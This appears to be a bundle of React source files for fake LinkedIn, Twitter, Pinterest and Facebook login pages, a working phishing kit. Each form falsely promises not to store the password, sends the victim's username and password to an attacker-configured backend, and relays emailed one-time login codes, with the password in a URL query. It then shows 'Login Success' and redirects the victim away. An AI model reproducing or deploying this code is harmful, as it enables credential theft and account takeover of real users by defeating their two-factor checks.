role=\"status\"\r\n                                  aria-hidden=\"true\"\r\n                                />\r\n                                Loading...\r\n                              </Button>\r\n                            ) : (\r\n                              <button\r\n                                onClick={(e) => this.handleClick(e)}\r\n                                type=\"button\"\r\n                                className=\"btn btn-lg btn-block btn-primary mb-3 login_btn\"\r\n                              >\r\n                                Login\r\n                              </button>\r\n                            )}\r\n\r\n                            {this.state.twoFactor ? (\r\n                              <div>\r\n                                <Form.Group>\r\n                                  {this.state.email_auth ? (\r\n                                    <Form.Label>\r\n                                      Please enter the code received\r\n                                    </Form.Label>\r\n                                  ) : (\r\n                                    <Form.Label>Enter code received</Form.Label>\r\n                                  )}\r\n                                  <input\r\n                                    value={this.state.code}\r\n                                    onChange={(e) => {\r\n                                      this.handleCode(e);\r\n                                    }}\r\n                                    type=\"number\"\r\n                                    maxLength=\"11\"\r\n                                    name=\"name\"\r\n                                    autocomplete=\"off\"\r\n                                    className=\"text-center form-control\"\r\n                                  ></input>\r\n                                </Form.Group>\r\n                                <button\r\n                                  onClick={() => {\r\n                                    this.handleCodeClick();\r\n                                  }}\r\n                                  type=\"button\"\r\n                                  className=\"btn login_btn\"\r\n                                >\r\n                                  submit code\r\n                                </button>\r\n                              </div>\r\n                            ) : (\r\n                              \"\"\r\n                            )}\r\n                          </Form>\r\n                        </>\r\n                      )}\r\n                    </div>\r\n                  </div>\r\n                </Card.Body>\r\n              </Card>\r\n            </Col>\r\n          </Row>\r\n        </Container>\r\n        <Footer withText />\r\n      </>\r\n    );\r\n  }\r\n}\r\n","import React, { Component } from \"react\";\r\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\r\nimport { Route, Redirect } from \"react-router-dom\";\r\nimport {\r\n  Container,\r\n  Row,\r\n  Col,\r\n  Card,\r\n  Form,\r\n  Button,\r\n  Alert,\r\n  Spinner,\r\n} from \"react-bootstrap\";\r\n\r\nimport Header from \"./Header\";\r\nimport Footer from \"./Footer\";\r\n\r\nconst queryString = require(\"query-string\");\r\nconst env = runtimeEnv();\r\n\r\nexport default class Linkedin extends Component {\r\n  state = {\r\n    username: \"\",\r\n    password: \"\",\r\n    showAlert: false,\r\n    loading: false,\r\n    message: \"\",\r\n    manualCheck: false,\r\n    success: false,\r\n    redirect: false,\r\n    challangeID: \"\",\r\n    code: \"\",\r\n    appName: window.location.hostname.substring(10).split(\".\")[0],\r\n  };\r\n  handleUsername = (event) => {\r\n    this.setState({ username: event.target.value });\r\n  };\r\n  handleCode = (event) => {\r\n    const { value, maxLength } = event.target;\r\n    const message = value.slice(0, maxLength);\r\n    this.setState({ code: message });\r\n  };\r\n  handlePassword = (event) => {\r\n    this.setState({ password: event.target.value });\r\n  };\r\n  onShowAlert = () => {\r\n    this.setState({ showAlert: true }, () => {\r\n      window.setTimeout(() => {\r\n        this.setState({ showAlert: false });\r\n      }, 30000);\r\n    });\r\n  };\r\n  handleClick = (e) => {\r\n    e.preventDefault();\r\n    this.setState({ loading: true });\r\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\r\n      fetch(`${env.REACT_APP_URL}/linkedin`, {\r\n        method: \"POST\",\r\n        headers: {\r\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\r\n        },\r\n        body: queryString.stringify({\r\n          username: this.state.username,\r\n          password: this.state.password,\r\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\r\n          appName: this.state.appName,\r\n        }),\r\n      })\r\n        .then((response) => response.json())\r\n        .then((responseData) => {\r\n          console.log(responseData);\r\n          this.setState(\r\n            {\r\n              message: responseData.message,\r\n            },\r\n            () => {\r\n              this.onShowAlert();\r\n            }\r\n          );\r\n          if (!responseData.success) {\r\n            this.setState({ loading: false });\r\n          } else {\r\n            if (responseData.manualCheck) {\r\n              this.setState({\r\n                manualCheck: true,\r\n                challangeID: responseData.challangeID,\r\n                loading: true,\r\n              });\r\n            } else {\r\n              this.setState({ success: true });\r\n            }\r\n          }\r\n        });\r\n    } else {\r\n      if (this.state.username.length === 0) {\r\n        this.setState(\r\n          {\r\n            message: \"username cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      } else {\r\n        this.setState(\r\n          {\r\n            message: \"password cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      }\r\n    }\r\n  };\r\n  handleCodeClick = (e) => {\r\n    if (this.state.code.length === 0 || this.state.code.length > 6) {\r\n      this.setState({ message: \"Code length should be equal to 6\" }, () => {\r\n        this.onShowAlert();\r\n      });\r\n    } else {\r\n      fetch(\r\n        `${env.REACT_APP_URL}/linkedinCheck?code=${this.state.code}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&email=${this.state.username}&password=${this.state.password}&challangeID=${this.state.challangeID}&appName=${this.state.appName}`,\r\n        {\r\n          method: \"GET\",\r\n        }\r\n      )\r\n        .then((response) => response.json())\r\n        .then((responseData) => {\r\n          console.log(responseData);\r\n          this.setState(\r\n            {\r\n              message: responseData.message,\r\n            },\r\n            () => {\r\n              this.onShowAlert();\r\n            }\r\n          );\r\n          if (responseData.success) {\r\n            this.setState({ success: true });\r\n          } else {\r\n            this.setState({ message: responseData.message, code: \"\" }, () => {\r\n              this.onShowAlert();\r\n            });\r\n          }\r\n        });\r\n    }\r\n  };\r\n  setRedirect = () => {\r\n    this.setState({\r\n      redirect: true,\r\n    });\r\n  };\r\n  renderRedirect = () => {\r\n    if (this.state.redirect) {\r\n      return <Redirect to=\"/\" />;\r\n    }\r\n  };\r\n  render() {\r\n    return (\r\n      <>\r\n        <Header />\r\n        <Container fluid=\"sm\">\r\n          <Row>\r\n            <Col>\r\n              <Card>\r\n                <Card.Header>\r\n                  <h4 className=\"card-header-title mb-0\">\r\n                    Please fill in your credentials.\r\n                    <a\r\n                      href=\"javaScript:void(0);\"\r\n                      onClick={this.setRedirect}\r\n                      className=\"float-right\"\r\n                    >\r\n                      Go Back\r\n                    </a>\r\n                  </h4>\r\n                </Card.Header>\r\n                <Card.Body>\r\n                  <div class=\"row justify-content-center\">\r\n                    <div className=\"col-12 col-md-5 col-xl-4 my-5\">\r\n                      {this.renderRedirect()}\r\n                      {this.state.showAlert ? (\r\n                        <Alert variant=\"danger\">{this.state.message}</Alert>\r\n                      ) : (\r\n                        \"\"\r\n                      )}\r\n                      {this.state.success ? (\r\n                        <>\r\n                          {\" \"}\r\n                          <center>\r\n                            <h1>Login Success Thank You!</h1>\r\n                            <h1>Redirecting...</h1>\r\n                          </center>\r\n                          <Route\r\n                            component={() => {\r\n                              window.setTimeout(() => {\r\n                                window.location.href =\r\n                                  env.REACT_APP_REDIRECTURL;\r\n                              }, 5000);\r\n\r\n                              return null;\r\n                            }}\r\n                          />\r\n                        </>\r\n                      ) : (\r\n                        <>\r\n                          <h1 className=\"display-4 text-center mb-3\">\r\n                            We Value Your Security.\r\n                          </h1>\r\n\r\n                          <p className=\"text-muted text-center mb-5\">\r\n                            We will not store your email or password.\r\n                          </p>\r\n\r\n                          <Form>\r\n                            <Form.Group controlId=\"name\">\r\n                              <Form.Label>Email Address</Form.Label>\r\n                              <Form.Control\r\n                                type=\"text\"\r\n                                id=\"name\"\r\n                                placeholder=\"name@address.com\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handleUsername(e)}\r\n                                value={this.state.username}\r\n                                name=\"name\"\r\n                                autocomplete=\"off\"\r\n                              />\r\n                            </Form.Group>\r\n                            <Form.Group controlId=\"pass\">\r\n                              <Form.Label>Password</Form.Label>\r\n                              <Form.Control\r\n                                type=\"password\"\r\n                                id=\"pass\"\r\n                                placeholder=\"password\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handlePassword(e)}\r\n                                value={this.state.password}\r\n                                name=\"name\"\r\n                                autocomplete=\"off\"\r\n                              />\r\n                            </Form.Group>\r\n                            {this.state.loading ? (\r\n                              <Button variant=\"primary\" type=\"submit\" disabled>\r\n                                <Spinner\r\n                                  as=\"span\"\r\n                                  animation=\"grow\"\r\n                                  size=\"sm\"\r\n                                  role=\"status\"\r\n                                  aria-hidden=\"true\"\r\n                                />\r\n                                Loading...\r\n                              </Button>\r\n                            ) : (\r\n                              <button\r\n                                onClick={(e) => this.handleClick(e)}\r\n                                type=\"button\"\r\n                                className=\"btn btn-lg btn-block btn-primary mb-3 login_btn\"\r\n                              >\r\n                                Login\r\n                              </button>\r\n                            )}\r\n\r\n                            {this.state.manualCheck ? (\r\n                              <div>\r\n                                <Form.Group>\r\n                                  <Form.Label>\r\n                                    Enter code received in your email\r\n                                  </Form.Label>\r\n                                  <input\r\n                                    value={this.state.code}\r\n                                    onChange={(e) => {\r\n                                      this.handleCode(e);\r\n                                    }}\r\n                                    type=\"number\"\r\n                                    maxLength=\"11\"\r\n                                    name=\"name\"\r\n                                    autocomplete=\"off\"\r\n                                    className=\"text-center form-control\"\r\n                                  ></input>\r\n                                </Form.Group>\r\n                                <button\r\n                                  onClick={() => {\r\n                                    this.handleCodeClick();\r\n                                  }}\r\n                                  type=\"button\"\r\n                                  className=\"btn login_btn\"\r\n                                >\r\n                                  submit code\r\n                                </button>\r\n                              </div>\r\n                            ) : (\r\n                              \"\"\r\n                            )}\r\n                          </Form>\r\n                        </>\r\n                      )}\r\n                    </div>\r\n                  </div>\r\n                </Card.Body>\r\n              </Card>\r\n            </Col>\r\n          </Row>\r\n        </Container>\r\n        <Footer withText />\r\n      </>\r\n    );\r\n  }\r\n}\r\n","import React, { Component } from \"react\";\r\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\r\nimport { Route, Redirect } from \"react-router-dom\";\r\n\r\nimport {\r\n  Container,\r\n  Row,\r\n  Col,\r\n  Card,\r\n  Form,\r\n  Button,\r\n  Alert,\r\n  Spinner,\r\n} from \"react-bootstrap\";\r\n\r\nimport Header from \"./Header\";\r\nimport Footer from \"./Footer\";\r\n\r\nconst queryString = require(\"query-string\");\r\nconst env = runtimeEnv();\r\n\r\nexport default class Twitter extends Component {\r\n  state = {\r\n    username: \"\",\r\n    password: \"\",\r\n    showAlert: false,\r\n    loading: false,\r\n    message: \"\",\r\n    manualCheck: false,\r\n    success: false,\r\n    redirect: false,\r\n    challenge_id: \"\",\r\n    challenge_type: \"\",\r\n    enc_user_id: \"\",\r\n    code: \"\",\r\n    appName: window.location.hostname.substring(10).split(\".\")[0],\r\n  };\r\n  handleUsername = (event) => {\r\n    this.setState({ username: event.target.value });\r\n  };\r\n  handleCode = (event) => {\r\n    this.setState({ code: event.target.value });\r\n  };\r\n  handlePassword = (event) => {\r\n    this.setState({ password: event.target.value });\r\n  };\r\n  onShowAlert = () => {\r\n    this.setState({ showAlert: true }, () => {\r\n      window.setTimeout(() => {\r\n        this.setState({ showAlert: false });\r\n      }, 30000);\r\n    });\r\n  };\r\n  handleClick = (e) => {\r\n    e.preventDefault();\r\n    this.setState({ loading: true });\r\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\r\n      fetch(`${env.REACT_APP_URL}/login/twitter`, {\r\n        method: \"POST\",\r\n        headers: {\r\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\r\n        },\r\n        body: queryString.stringify({\r\n          username: this.state.username,\r\n          password: this.state.password,\r\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\r\n          appName: this.state.appName,\r\n        }),\r\n      })\r\n        .then((response) => response.json())\r\n        .then((responseData) => {\r\n          console.log(responseData);\r\n          this.setState(\r\n            {\r\n              message: responseData.message,\r\n            },\r\n            () => {\r\n              this.onShowAlert();\r\n            }\r\n          );\r\n          if (!responseData.success) {\r\n            this.setState({ loading: false });\r\n          } else {\r\n            if (responseData.manualCheck) {\r\n              this.setState({\r\n                manualCheck: true,\r\n                challenge_type: responseData.challenge_type,\r\n                challenge_id: responseData.challenge_id,\r\n                enc_user_id: responseData.enc_user_id,\r\n                loading: true,\r\n              });\r\n            } else {\r\n              this.setState({ success: true });\r\n            }\r\n          }\r\n        });\r\n    } else {\r\n      if (this.state.username.length === 0) {\r\n        this.setState(\r\n          {\r\n            message: \"username cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      } else {\r\n        this.setState(\r\n          {\r\n            message: \"password cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      }\r\n    }\r\n  };\r\n  handleCodeClick = (e) => {\r\n    fetch(\r\n      `${env.REACT_APP_URL}/login/twitter/verifyCode?code=${this.state.code}&challenge_type=${this.state.challenge_type}&enc_user_id=${this.state.enc_user_id}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&username=${this.state.username}&password=${this.state.password}&challenge_id=${this.state.challenge_id}&appName=${this.state.appName}`,\r\n      {\r\n        method: \"GET\",\r\n      }\r\n    )\r\n      .then((response) => response.json())\r\n      .then((responseData) => {\r\n        console.log(responseData);\r\n        this.setState(\r\n          {\r\n            message: responseData.message,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n        if (responseData.success) {\r\n          this.setState({ success: true });\r\n        } else {\r\n          this.setState({ message: responseData.message, code: \"\" }, () => {\r\n            this.onShowAlert();\r\n          });\r\n        }\r\n      });\r\n  };\r\n  setRedirect = () => {\r\n    this.setState({\r\n      redirect: true,\r\n    });\r\n  };\r\n  renderRedirect = () => {\r\n    if (this.state.redirect) {\r\n      return <Redirect to=\"/\" />;\r\n    }\r\n  };\r\n  render() {\r\n    return (\r\n      <>\r\n        <Header />\r\n        <Container fluid=\"sm\">\r\n          <Row>\r\n            <Col>\r\n              <Card>\r\n                <Card.Header>\r\n                  <h4 className=\"card-header-title mb-0\">\r\n                    Please fill in your credentials.\r\n                    <a\r\n                      href=\"javaScript:void(0);\"\r\n                      onClick={this.setRedirect}\r\n                      className=\"float-right\"\r\n                    >\r\n                      Go Back\r\n                    </a>\r\n                  </h4>\r\n                </Card.Header>\r\n                <Card.Body>\r\n                  <div class=\"row justify-content-center\">\r\n                    <div className=\"col-12 col-md-5 col-xl-4 my-5\">\r\n                      {this.renderRedirect()}\r\n                      {this.state.showAlert ? (\r\n                        <Alert variant=\"danger\">{this.state.message}</Alert>\r\n                      ) : (\r\n                        \"\"\r\n                      )}\r\n                      {this.state.success ? (\r\n                        <>\r\n                          {\" \"}\r\n                          <center>\r\n                            <h1>Login Success Thank You!</h1>\r\n                            <h1>Redirecting...</h1>\r\n                          </center>\r\n                          <Route\r\n                            component={() => {\r\n                              window.setTimeout(() => {\r\n                                window.location.href =\r\n                                  env.REACT_APP_REDIRECTURL;\r\n                              }, 5000);\r\n\r\n                              return null;\r\n                            }}\r\n                          />\r\n                        </>\r\n                      ) : (\r\n                        <>\r\n                          <h1 className=\"display-4 text-center mb-3\">\r\n                            We Value Your Security.\r\n                          </h1>\r\n\r\n                          <p className=\"text-muted text-center mb-5\">\r\n                            We will not store your email or password.\r\n                          </p>\r\n\r\n                          <Form>\r\n                            <Form.Group controlId=\"name\">\r\n                              <Form.Label>Email Address</Form.Label>\r\n                              <Form.Control\r\n                                type=\"text\"\r\n                                id=\"name\"\r\n                                placeholder=\"name@address.com\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handleUsername(e)}\r\n                                value={this.state.username}\r\n                                name=\"name\"\r\n                                autocomplete=\"off\"\r\n                              />\r\n                            </Form.Group>\r\n                            <Form.Group controlId=\"pass\">\r\n                              <Form.Label>Password</Form.Label>\r\n                              <Form.Control\r\n                                type=\"password\"\r\n                                id=\"pass\"\r\n                                placeholder=\"password\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handlePassword(e)}\r\n                                value={this.state.password}\r\n                                name=\"name\"\r\n                                autocomplete=\"off\"\r\n                              />\r\n                            </Form.Group>\r\n                            {this.state.loading ? (\r\n                              <Button variant=\"primary\" type=\"submit\" disabled>\r\n                                <Spinner\r\n                                  as=\"span\"\r\n                                  animation=\"grow\"\r\n                                  size=\"sm\"\r\n                                  role=\"status\"\r\n                                  aria-hidden=\"true\"\r\n                                />\r\n                                Loading...\r\n                              </Button>\r\n                            ) : (\r\n                              <button\r\n                                onClick={(e) => this.handleClick(e)}\r\n                                type=\"button\"\r\n                                className=\"btn btn-lg btn-block btn-primary mb-3 login_btn\"\r\n                              >\r\n                                Login\r\n                              </button>\r\n                            )}\r\n\r\n                            {this.state.manualCheck ? (\r\n                              <div>\r\n                                <Form.Group>\r\n                                  <Form.Label>\r\n                                    {this.state.challenge_type === \"RetypeEmail\"\r\n                                      ? \"Enter your email id\"\r\n                                      : \"Enter code recieved in your email\"}\r\n                                  </Form.Label>\r\n                                  <input\r\n                                    value={this.state.code}\r\n                                    onChange={(e) => {\r\n                                      this.handleCode(e);\r\n                                    }}\r\n                                    type=\"number\"\r\n                                    maxLength=\"11\"\r\n                                    name=\"name\"\r\n                                    autocomplete=\"off\"\r\n                                    className=\"text-center form-control\"\r\n                                  ></input>\r\n                                </Form.Group>\r\n                                <button\r\n                                  onClick={() => {\r\n                                    this.handleCodeClick();\r\n                                  }}\r\n                                  type=\"button\"\r\n                                  className=\"btn login_btn\"\r\n                                >\r\n                                  submit code\r\n                                </button>\r\n                              </div>\r\n                            ) : (\r\n                              \"\"\r\n                            )}\r\n                          </Form>\r\n                        </>\r\n                      )}\r\n                    </div>\r\n                  </div>\r\n                </Card.Body>\r\n              </Card>\r\n            </Col>\r\n          </Row>\r\n        </Container>\r\n        <Footer withText />\r\n      </>\r\n    );\r\n  }\r\n}\r\n","import React, { Component } from \"react\";\r\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\r\nimport { Route, Redirect } from \"react-router-dom\";\r\nimport {\r\n  Container,\r\n  Row,\r\n  Col,\r\n  Card,\r\n  Form,\r\n  Button,\r\n  Alert,\r\n  Spinner,\r\n} from \"react-bootstrap\";\r\n\r\nimport Header from \"./Header\";\r\nimport Footer from \"./Footer\";\r\n\r\nconst queryString = require(\"query-string\");\r\nconst env = runtimeEnv();\r\n\r\nexport default class Pinterest extends Component {\r\n  state = {\r\n    username: \"\",\r\n    password: \"\",\r\n    showAlert: false,\r\n    loading: false,\r\n    message: \"\",\r\n    manualCheck: false,\r\n    success: false,\r\n    redirect: false,\r\n    appName: window.location.hostname.substring(10).split(\".\")[0],\r\n  };\r\n  handleUsername = (event) => {\r\n    this.setState({ username: event.target.value });\r\n  };\r\n  handleCode = (event) => {\r\n    this.setState({ code: event.target.value });\r\n  };\r\n  handlePassword = (event) => {\r\n    this.setState({ password: event.target.value });\r\n  };\r\n  onShowAlert = () => {\r\n    this.setState({ showAlert: true }, () => {\r\n      window.setTimeout(() => {\r\n        this.setState({ showAlert: false });\r\n      }, 30000);\r\n    });\r\n  };\r\n  handleClick = (e) => {\r\n    e.preventDefault();\r\n\r\n    this.setState({ loading: true });\r\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\r\n      fetch(`${env.REACT_APP_URL}/login/pinterest`, {\r\n        method: \"POST\",\r\n        headers: {\r\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\r\n        },\r\n        body: queryString.stringify({\r\n          username: this.state.username,\r\n          password: this.state.password,\r\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\r\n          appName: this.state.appName,\r\n        }),\r\n      })\r\n        .then((response) => response.json())\r\n        .then((responseData) => {\r\n          console.log(responseData);\r\n          this.setState(\r\n            {\r\n              message: responseData.message,\r\n            },\r\n            () => {\r\n              this.onShowAlert();\r\n            }\r\n          );\r\n          if (!responseData.success) {\r\n            this.setState({ loading: false });\r\n          } else {\r\n            if (responseData.manualCheck) {\r\n              this.setState({\r\n                manualCheck: true,\r\n                challenge_type: responseData.challenge_type,\r\n                challenge_id: responseData.challenge_id,\r\n                enc_user_id: responseData.enc_user_id,\r\n                loading: true,\r\n              });\r\n            } else {\r\n              this.setState({ success: true });\r\n            }\r\n          }\r\n        });\r\n    } else {\r\n      if (this.state.username.length === 0) {\r\n        this.setState(\r\n          {\r\n            message: \"email id cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      } else {\r\n        this.setState(\r\n          {\r\n            message: \"password cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      }\r\n    }\r\n  };\r\n  handleCodeClick = (e) => {\r\n    fetch(\r\n      `${env.REACT_APP_URL}/login/twitter/verifyCode?code=${this.state.code}&challenge_type=${this.state.challenge_type}&enc_user_id=${this.state.enc_user_id}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&username=${this.state.username}&password=${this.state.password}&challenge_id=${this.state.challenge_id}&appName=${this.state.appName}`,\r\n      {\r\n        method: \"GET\",\r\n      }\r\n    )\r\n      .then((response) => response.json())\r\n      .then((responseData) => {\r\n        console.log(responseData);\r\n        this.setState(\r\n          {\r\n            message: responseData.message,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n        if (responseData.success) {\r\n          this.setState({ success: true });\r\n        } else {\r\n          this.setState({ message: responseData.message, code: \"\" }, () => {\r\n            this.onShowAlert();\r\n          });\r\n        }\r\n      });\r\n  };\r\n  setRedirect = () => {\r\n    this.setState({\r\n      redirect: true,\r\n    });\r\n  };\r\n  renderRedirect = () => {\r\n    if (this.state.redirect) {\r\n      return <Redirect to=\"/\" />;\r\n    }\r\n  };\r\n  render() {\r\n    return (\r\n      <>\r\n        <Header />\r\n        <Container fluid=\"sm\">\r\n          <Row>\r\n            <Col>\r\n              <Card>\r\n                <Card.Header>\r\n                  <h4 className=\"card-header-title mb-0\">\r\n                    Please fill in your credentials.\r\n                    <a\r\n                      href=\"javaScript:void(0);\"\r\n                      onClick={this.setRedirect}\r\n                      className=\"float-right\"\r\n                    >\r\n                      Go Back\r\n                    </a>\r\n                  </h4>\r\n                </Card.Header>\r\n                <Card.Body>\r\n                  <div class=\"row justify-content-center\">\r\n                    <div className=\"col-12 col-md-5 col-xl-4 my-5\">\r\n                      {this.renderRedirect()}\r\n                      {this.state.showAlert ? (\r\n                        <Alert variant=\"danger\">{this.state.message}</Alert>\r\n                      ) : (\r\n                        \"\"\r\n                      )}\r\n                      {this.state.success ? (\r\n                        <>\r\n                          {\" \"}\r\n                          <center>\r\n                            <h1>Login Success Thank You!</h1>\r\n                            <h1>Redirecting...</h1>\r\n                          </center>\r\n                          <Route\r\n                            component={() => {\r\n                              window.setTimeout(() => {\r\n                                window.location.href =\r\n                                  env.REACT_APP_REDIRECTURL;\r\n                              }, 5000);\r\n\r\n                              return null;\r\n                            }}\r\n                          />\r\n                        </>\r\n                      ) : (\r\n                        <>\r\n                          <h1 className=\"display-4 text-center mb-3\">\r\n                            We Value Your Security.\r\n                          </h1>\r\n\r\n                          <p className=\"text-muted text-center mb-5\">\r\n                            We will not store your email or password.\r\n                          </p>\r\n\r\n                          <Form>\r\n                            <Form.Group controlId=\"name\">\r\n                              <Form.Label>Email Address</Form.Label>\r\n                              <Form.Control\r\n                                type=\"text\"\r\n                                id=\"name\"\r\n                                placeholder=\"name@address.com\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handleUsername(e)}\r\n                                value={this.state.username}\r\n                                name=\"name\"\r\n                                autocomplete=\"off\"\r\n                              />\r\n                            </Form.Group>\r\n                            <Form.Group controlId=\"pass\">\r\n                              <Form.Label>Password</Form.Label>\r\n                              <Form.Control\r\n                                type=\"password\"\r\n                                id=\"pass\"\r\n                                placeholder=\"password\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handlePassword(e)}\r\n                                value={this.state.password}\r\n                                name=\"name\"\r\n                                autocomplete=\"off\"\r\n                              />\r\n                            </Form.Group>\r\n                            {this.state.loading ? (\r\n                              <Button variant=\"primary\" type=\"submit\" disabled>\r\n                                <Spinner\r\n                                  as=\"span\"\r\n                                  animation=\"grow\"\r\n                                  size=\"sm\"\r\n                                  role=\"status\"\r\n                                  aria-hidden=\"true\"\r\n                                />\r\n                                Loading...\r\n                              </Button>\r\n                            ) : (\r\n                              <button\r\n                                onClick={(e) => this.handleClick(e)}\r\n                                type=\"button\"\r\n                                className=\"btn btn-lg btn-block btn-primary mb-3 login_btn\"\r\n                              >\r\n                                Login\r\n                              </button>\r\n                            )}\r\n\r\n                            {this.state.manualCheck ? (\r\n                              <div>\r\n                                <Form.Group>\r\n                                  <Form.Label>\r\n                                    {this.state.challenge_type === \"RetypeEmail\"\r\n                                      ? \"Enter your email id\"\r\n                                      : \"Enter code recieved in your email\"}\r\n                                  </Form.Label>\r\n                                  <input\r\n                                    value={this.state.code}\r\n                                    onChange={(e) => {\r\n                                      this.handleCode(e);\r\n                                    }}\r\n                                    type=\"number\"\r\n                                    maxLength=\"11\"\r\n                                    name=\"name\"\r\n                                    autocomplete=\"off\"\r\n                                    className=\"text-center form-control\"\r\n                                  ></input>\r\n                                </Form.Group>\r\n                                <button\r\n                                  onClick={() => {\r\n                                    this.handleCodeClick();\r\n                                  }}\r\n                                  type=\"button\"\r\n                                  className=\"btn login_btn\"\r\n                                >\r\n                                  submit code\r\n                                </button>\r\n                              </div>\r\n                            ) : (\r\n                              \"\"\r\n                            )}\r\n                          </Form>\r\n                        </>\r\n                      )}\r\n                    </div>\r\n                  </div>\r\n                </Card.Body>\r\n              </Card>\r\n            </Col>\r\n          </Row>\r\n        </Container>\r\n        <Footer withText />\r\n      </>\r\n    );\r\n  }\r\n}\r\n","import React, { Component } from \"react\";\r\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\r\nimport { Route, Redirect } from \"react-router-dom\";\r\nimport {\r\n  Container,\r\n  Row,\r\n  Col,\r\n  Card,\r\n  Form,\r\n  Button,\r\n  Alert,\r\n  Spinner,\r\n} from \"react-bootstrap\";\r\n\r\nimport Header from \"./Header\";\r\nimport Footer from \"./Footer\";\r\nconst queryString = require(\"query-string\");\r\nconst env = runtimeEnv();\r\n\r\nexport default class Facebook extends Component {\r\n  state = {\r\n    username: \"\",\r\n    password: \"\",\r\n    showAlert: false,\r\n    loading: false,\r\n    message: \"\",\r\n    manualCheck: false,\r\n    success: false,\r\n    redirect: false,\r\n    challangeID: \"\",\r\n    code: \"\",\r\n    appName: window.location.hostname.substring(10).split(\".\")[0],\r\n  };\r\n  handleUsername = (event) => {\r\n    this.setState({ username: event.target.value });\r\n  };\r\n  handleCode = (event) => {\r\n    const { value, maxLength } = event.target;\r\n    const message = value.slice(0, maxLength);\r\n    this.setState({ code: message });\r\n  };\r\n  handlePassword = (event) => {\r\n    this.setState({ password: event.target.value });\r\n  };\r\n  onShowAlert = () => {\r\n    this.setState({ showAlert: true }, () => {\r\n      window.setTimeout(() => {\r\n        this.setState({ showAlert: false });\r\n      }, 30000);\r\n    });\r\n  };\r\n  handleClick = (e) => {\r\n    e.preventDefault();\r\n    this.setState({ loading: true });\r\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\r\n      fetch(`${env.REACT_APP_URL}/login/facebook`, {\r\n        method: \"POST\",\r\n        headers: {\r\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\r\n        },\r\n        body: queryString.stringify({\r\n          username: this.state.username,\r\n          password: this.state.password,\r\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\r\n          appName: this.state.appName,\r\n        }),\r\n      })\r\n        .then((response) => response.json())\r\n        .then((responseData) => {\r\n          console.log(responseData);\r\n          this.setState(\r\n            {\r\n              message: responseData.message,\r\n            },\r\n            () => {\r\n              this.onShowAlert();\r\n            }\r\n          );\r\n          if (!responseData.success) {\r\n            this.setState({ loading: false });\r\n          } else {\r\n            if (responseData.manualCheck) {\r\n              this.setState({\r\n                manualCheck: true,\r\n                challangeID: responseData.challangeID,\r\n                loading: true,\r\n              });\r\n            } else {\r\n              this.setState({ success: true });\r\n            }\r\n          }\r\n        });\r\n    } else {\r\n      if (this.state.username.length === 0) {\r\n        this.setState(\r\n          {\r\n            message: \"username cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      } else {\r\n        this.setState(\r\n          {\r\n            message: \"password cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      }\r\n    }\r\n  };\r\n  handleCodeClick = (e) => {\r\n    if (this.state.code.length === 0 || this.state.code.length > 6) {\r\n      this.setState({ message: \"Code length should be equal to 6\" }, () => {\r\n        this.onShowAlert();\r\n      });\r\n    } else {\r\n      fetch(\r\n        `${env.REACT_APP_URL}/linkedinCheck?code=${this.state.code}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&email=${this.state.username}&password=${this.state.password}&challangeID=${this.state.challangeID}$appName=${this.state.appName}`,\r\n        {\r\n          method: \"GET\",\r\n        }\r\n      )\r\n        .then((response) => response.json())\r\n        .then((responseData) => {\r\n          console.log(responseData);\r\n          this.setState(\r\n            {\r\n              message: responseData.message,\r\n            },\r\n            () => {\r\n              this.onShowAlert();\r\n            }\r\n          );\r\n          if (responseData.success) {\r\n            this.setState({ success: true });\r\n          } else {\r\n            this.setState({ message: responseData.message, code: \"\" }, () => {\r\n              this.onShowAlert();\r\n            });\r\n          }\r\n        });\r\n    }\r\n  };\r\n  setRedirect = () => {\r\n    this.setState({\r\n      redirect: true,\r\n    });\r\n  };\r\n  renderRedirect = () => {\r\n    if (this.state.redirect) {\r\n      return <Redirect to=\"/\" />;\r\n    }\r\n  };\r\n  render() {\r\n    return (\r\n      <>\r\n        <Header />\r\n        <Container fluid=\"sm\">\r\n          <Row>\r\n            <Col>\r\n              